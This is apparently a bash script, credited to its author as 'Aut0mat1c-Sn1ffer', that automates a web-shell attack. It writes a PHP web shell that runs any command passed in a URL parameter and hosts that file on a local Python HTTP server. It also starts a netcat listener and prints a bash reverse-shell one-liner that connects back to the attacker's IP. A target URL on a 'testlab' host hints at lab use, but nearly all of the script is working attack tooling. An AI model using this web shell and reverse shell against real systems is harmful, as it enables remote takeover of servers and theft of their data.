#!/bin/bash
sudo apt update
sudo apt install xterm
sudo apt install python3
clear
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

cleanup() {
    pkill -P $$
    exit
}
trap cleanup SIGINT

clear
echo -e "${RED}--| Created By UMIT SAMET TASCI |--"
echo -e "-------| Aut0mat1c-Sn1ffer |-------${NC}"
sleep 1

TARGET_DIR="$HOME/Desktop/X"
mkdir -p "$TARGET_DIR"
cd "$TARGET_DIR" || exit

cat <<EOF > kabuk.txt
<?php
if(isset(\$_GET['cmd'])) {
    echo "<pre>";
    system(\$_GET['cmd']);
    echo "</pre>";
} else {
    echo "Aut0mat1c-Sn1ffer is active. (Usage: ?cmd=[command])";
}
?>
EOF

MY_IP=$(hostname -I | awk '{print $1}')
HTTP_PORT=8080
NC_PORT=9999

check_port() {
    if lsof -Pi :$1 -sTCP:LISTEN -t >/dev/null ; then
        echo -e "${RED}[!] Port $1 busy!${NC}"
        exit 1
    fi
}
check_port $HTTP_PORT
check_port $NC_PORT

xterm -T "Payload Server" -geometry 80x20+0+0 -hold -e "python3 -m http.server $HTTP_PORT" &

xterm -T "NC Listener" -geometry 80x20+500+0 -hold -e \
"echo -e '${GREEN}Listening...${NC}'; 
 echo '--------------------------------------------------';
 echo 'URL: http://ninja.testlab.local/kabuk.php?cmd=id';
 echo 'REV: bash -i >& /dev/tcp/$MY_IP/$NC_PORT 0>&1';
 echo '--------------------------------------------------';
 nc -lvp $NC_PORT" &

echo -e "${GREEN}[✔] Ready. Press CTRL+C to stop.${NC}"
wait
